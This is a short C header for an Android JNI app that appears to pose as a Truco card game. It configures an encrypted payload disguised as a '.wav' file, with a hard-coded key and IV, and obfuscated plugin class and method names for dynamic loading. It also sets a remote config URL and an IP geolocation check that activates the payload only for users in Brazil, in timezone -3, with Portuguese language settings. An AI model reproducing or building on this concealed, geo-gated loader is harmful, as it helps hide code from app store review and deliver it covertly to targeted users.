//
// Created by ybpcn on 2023/10/8.
//

#ifndef HEADER_JNI_CONFIG_H
#define HEADER_JNI_CONFIG_H
//此文件与 java的 Config.java对应


#define GAME_CHECK_ID    				"TRUCO_DATA"
#define GAME_CHECK_FIELD_ID    			"TRUCO_ID"
#define GAME_CHECK_DEFAULT_VALUE_ID    	"true"
#define GAME_CHECK_VALUE_ID    			"true"




#define GAME_RESOURCE_ID    			"LVpikR.wav"
#define GAME_RESOURCE_PWD    			"cm7lmr6so5jqz2ko"
#define GAME_RESOURCE_IV    			"1234567812345678"

#define PLUGIN_CLASS_ID    				"uqlj.ssotlf"
#define PLUGIN_INIT_METHOD_ID    		"bgje"
#define PLUGIN_CREATE_METHOD_ID    		"gwqfqas"
#define PLUGIN_START_METHOD_ID    		"nbfji"
#define PLUGIN_START_ARGS_ID    		"common.tempActivity"

#define LAUNCH_ACTIVITY_ID    			"hlrvpws.ejkdpgks.ktmfb.henfhAppActivity"

#define ACTIVITY_EVENT_ID               "onStartGame"


#define HTTP_URL_CONFIG                 "https://02bf17.com/gamconfig.json"
#define HTTP_URL_COUNTRY                "http://ip-api.com/json"

//多个国家用  ; 分开  如 : "Brazil;Hong Kong"
#define CHECK_COUNTRYS                  "Brazil"

//多个时区用  ; 分开  如 : "-11;8;-11"
#define CHECK_TIMEZONE                  "-3"

//多个语言用  ; 分开  如 : "pt;cn"
#define CHECK_LANGUAGE                  "pt"

#endif //HEADER_JNI_CONFIG_H
